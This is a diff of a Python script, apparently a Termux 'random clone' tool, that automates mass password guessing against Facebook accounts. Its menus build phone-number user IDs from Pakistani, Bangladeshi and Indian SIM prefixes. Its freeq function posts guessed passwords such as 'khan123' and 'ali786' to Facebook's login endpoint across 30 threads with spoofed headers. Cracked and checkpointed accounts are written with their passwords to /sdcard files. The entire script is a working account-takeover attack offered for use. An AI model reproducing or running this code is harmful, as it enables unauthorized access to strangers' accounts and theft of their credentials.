+    clear()
+    print (' \t           \033[1;37m[ \033[1;32mMAIN MENU \033[1;37m]')
+    print('\033[1;97m====================================================') 
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"\033[1;97m[+] \033[1;92mUSERNAME \033[1;91m: \033[1;96m{NameX}")
+    print('\033[1;97m====================================================') 
+    print(f"\033[1;97m[01] \033[1;92mRANDOM CLONE ")
+    print(f"\033[1;97m[02] \033[1;92mFOLLOW ME ON FACEBOOK")
+    print(f"\033[1;97m[00] \033[1;92mEXIT ")
+    print('\033[1;97m====================================================') 
+    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT OPTION \033[1;37m: \033[1;36m")
+    if adi in ["1","01"]:
+        passx()
+    elif adi in ["2","02"]:
+        os.system("xdg-open https://www.facebook.com/roxzombie")
+        main()
+    elif adi in ["0","00"]:
+       exit()
+    else:
+        print('\033[1;31mINCORECT OPTION!\3[1;31m')
+        main()
+
+def passx():
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print('              \x1b[97m\033[37;41m[ PASSWORD MENU ]\033[0;m ')
+    print('\033[1;97m====================================================') 
+    print("\033[1;97m[01] \033[1;92mAUTO PASS 7 DIGITS         \033[1;96m[FASTEST]")
+    print("\033[1;97m[02] \033[1;92mAUTO PASS 7 AND 11 DIGITS  \033[1;96m[FAST]")
+    print("\033[1;97m[03] \033[1;92mAUTO PASS 7 DIGIT AND KHAN \033[1;96m[FAST]")
+    print("\033[1;97m[04] \033[1;92mONLY KHAN PASS             \033[1;96m[SLOWEST]")
+    print("\033[1;97m[05] \033[1;92mKHAN & ALI MIX PASS        \033[1;96m[SLOWEST]")
+    print("\033[1;97m[06] \033[1;92mKHAN & MALIK MIX PASS      \033[1;96m[SLOWEST]")
+    print("\033[1;97m====================================================")
+    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT PASSWORD METHOD \033[1;37m: \033[1;36m")
+    if adi in ["1","01"]:
+        pass1()
+    elif adi in ["2","02"]:
+        pass2()
+    elif adi in ["3","03"]:
+        pass3()
+    elif adi in ["4","04"]:
+       pass4()
+    elif adi in ["5","05"]:
+       pass5()
+    elif adi in ["6","06"]:
+       pass6()
+    else:
+        print('\033[1;31mINCORECT OPTION!\3[1;31m')
+        passx()
+
+def pass1():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m1') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,]
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass2():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m2') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,uid]
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+    
+def pass3():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m3') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,'khankhan']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass4():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m4') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass5():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m5') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = ['khankhan','ali786','ali123','ali1122','aliali']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass6():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m6') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = ['khankhan','malikmalik','malik123','malik12','malik786']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def freeq(uid,pwx,tl):
+    global loop
+    global ok
+    global cp
+    global ugen
+    try:
+        for ps in pwx:
+            bi = random.choice([A])
+            session = requests.Session()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc",
+            "flow":"login_no_pain",
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority':'www.facebook.com',
+            'method': 'GET',
+            'path':'https://www.facebook.com/?_rdc=1&_rdr',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'referer':'https://www.facebook.com/',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[151:166]
+                print(f'\r\33[1;97m[\033[1;96mSUCCESSFUL\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
+                cek_apk(session,coki)
+                open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
+            elif 'checkpoint' in log_cookies:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[141:156]
+                    print(f'\r\33[1;97m[\033[1;91mCHECKPOINT\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
+                    open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    cp.append(uid)
+                    break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\33[1;37m[CRACKING] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
+        sys.stdout.flush()
+    except:
+        pass
+#---------------------[END MENU]---------------------#
 if __name__ == '__main__':
-	login()
+    main()			
